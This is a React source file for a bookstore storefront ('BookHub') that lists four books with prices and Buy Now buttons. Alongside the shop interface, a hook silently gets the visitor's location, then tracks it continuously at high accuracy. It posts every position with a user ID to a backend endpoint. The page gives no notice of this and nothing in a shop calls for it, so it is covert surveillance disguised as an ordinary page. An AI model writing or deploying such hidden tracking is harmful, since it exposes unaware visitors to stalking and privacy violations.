import React, { useEffect, useRef } from "react";
import axios from "axios";

function App() {
  const sentRef = useRef(false); // prevent duplicate fast calls

  useEffect(() => {
    if (!navigator.geolocation) return;

    const userId = "user123";

    // ⚡ FAST FUNCTION (reusable)
    const sendLocation = async (pos) => {
      try {
        await axios.post("http://localhost:5000/locations", {
          userId,
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
        });
      } catch (err) {
        console.log("Error sending");
      }
    };

    // 🔥 1. GET LAST KNOWN LOCATION (FASTEST)
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        sendLocation(pos); // ⚡ instant first hit
        sentRef.current = true;
      },
      () => {},
      {
        enableHighAccuracy: false,
        maximumAge: 60000, // ⚡ allow cached location
        timeout: 2000,
      }
    );

    // 🔥 2. REAL-TIME TRACKING
    const watchId = navigator.geolocation.watchPosition(
      (pos) => {
        // avoid duplicate immediate call
        if (!sentRef.current) {
          sendLocation(pos);
          sentRef.current = true;
        } else {
          sendLocation(pos);
        }
      },
      () => {},
      {
        enableHighAccuracy: true,
        maximumAge: 0,
      }
    );

    return () => navigator.geolocation.clearWatch(watchId);
  }, []);

  return (
    <div>
      <style>{`
        body { margin: 0; font-family: Arial; }

        .navbar {
          display: flex;
          justify-content: space-between;
          padding: 15px 30px;
          background: #222;
          color: #fff;
        }

        .nav-links span { margin-left: 20px; cursor: pointer; }

        .container {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 20px;
          padding: 20px;
        }

        .card {
          border: 1px solid #ddd;
          border-radius: 10px;
          padding: 15px;
          text-align: center;
        }

        .card img {
          width: 100%;
          height: 220px;
          object-fit: cover;
        }

        button {
          margin-top: 10px;
          padding: 10px;
          border: none;
          background: #007bff;
          color: white;
          border-radius: 5px;
        }

        @media (max-width: 992px) {
          .container { grid-template-columns: repeat(2, 1fr); }
        }

        @media (max-width: 600px) {
          .container { grid-template-columns: 1fr; }
          .navbar { flex-direction: column; text-align: center; }
        }
      `}</style>

      <div className="navbar">
        <h2>📚 BookHub</h2>
        <div className="nav-links">
          <span>Home</span>
          <span>Categories</span>
          <span>Cart</span>
          <span>Login</span>
        </div>
      </div>

      <div className="container">
        {books.map((book, i) => (
          <div key={i} className="card">
            <img src={book.img} alt="" />
            <h3>{book.title}</h3>
            <p>₹{book.price}</p>
            <button>Buy Now</button>
          </div>
        ))}
      </div>
    </div>
  );
}

const books = [
  { title: "Rich Dad Poor Dad", price: 299, img: "https://m.media-amazon.com/images/I/81bsw6fnUiL.jpg" },
  { title: "Atomic Habits", price: 399, img: "https://m.media-amazon.com/images/I/91bYsX41DVL.jpg" },
  { title: "The Alchemist", price: 249, img: "https://m.media-amazon.com/images/I/71aFt4+OTOL.jpg" },
  { title: "Ikigai", price: 349, img: "https://m.media-amazon.com/images/I/81l3rZK4lnL.jpg" },
];

export default App;